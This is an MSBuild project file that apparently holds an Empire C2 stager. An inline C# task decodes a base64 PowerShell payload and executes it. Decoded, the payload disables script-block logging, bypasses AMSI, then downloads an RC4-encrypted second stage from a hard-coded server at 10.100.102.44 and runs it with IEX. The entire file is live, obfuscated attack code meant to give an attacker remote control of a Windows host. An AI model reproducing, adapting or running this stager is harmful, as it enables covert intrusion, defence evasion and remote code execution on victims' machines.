<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBpAG8ATgAuAE0AQQBKAE8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBTAGUATQBCAEwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAGEATABVAGUAKAAkAE4AVQBsAGwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBMAD0AWwBDAE8ATABsAGUAQwBUAEkAbwBuAHMALgBHAEUATgBlAFIASQBDAC4ARABJAGMAVABJAE8ATgBhAFIAeQBbAFMAdABSAEkATgBHACwAUwBZAFMAdABlAG0ALgBPAEIAagBlAGMAVABdAF0AOgA6AG4AZQBXACgAKQA7ACQAdgBhAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUAbABTAGUAewBbAFMAQwBSAGkAUAB0AEIATABPAEMASwBdAC4AIgBHAGUAdABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAGwAdQBlACgAJABOAFUAbABMACwAKABOAGUAdwAtAE8AQgBKAGUAYwBUACAAQwBPAGwAbABlAGMAVABpAG8ATgBTAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBTAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAcwBTAEUATQBCAEwAeQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAGEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAUgB1AEUAKQB9ADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAGUAdAAuAFMARQByAHYAaQBDAEUAUABvAGkAbgBUAE0AYQBOAGEAZwBFAFIAXQA6ADoARQB4AHAAZQBDAHQAMQAwADAAQwBvAG4AdABJAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBFAFcALQBPAEIASgBFAEMAdAAgAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgAZQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBPAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBiAFIAZQBRAHUARQBTAHQAXQA6ADoARABlAGYAQQBVAEwAdABXAEUAQgBQAFIATwBYAHkAOwAkAHcAYwAuAFAAcgBvAFgAeQAuAEMAUgBlAEQARQBuAHQAaQBhAEwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAHQALgBDAFIARQBEAGUAbgBUAGkAYQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAHUATAB0AE4AZQB0AHcATwByAGsAQwBSAGUARABFAE4AdABJAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAdABlAE0ALgBUAGUAWAB0AC4ARQBuAEMAbwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQB0AEUAcwAoACcAbwA1AGMAbAArACwATABKADIAMQBBAF8AKABaAFsAdwB9AHMAfgB7AE8AIwAzACkAcgAwADoAUgBGAD8ANwBZACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwADAALgAxADAAMgAuADQANAA6ADgAMAAnADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBvAGkAWgB1AEIASQBLAE0AeABDAGIAdwBLAGYAegBtADMAZwArAFEASwBDADYAUQBqAEUAUQA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBkAEQAQQBUAGEAKAAkAHMAZQBSACsAJABUACkAOwAkAGkAVgA9ACQARABhAHQAYQBbADAALgAuADMAXQA7ACQARABBAHQAQQA9ACQARABBAFQAYQBbADQALgAuACQARABhAFQAYQAuAGwAZQBOAGcAVABIAF0AOwAtAGoATwBpAG4AWwBDAEgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>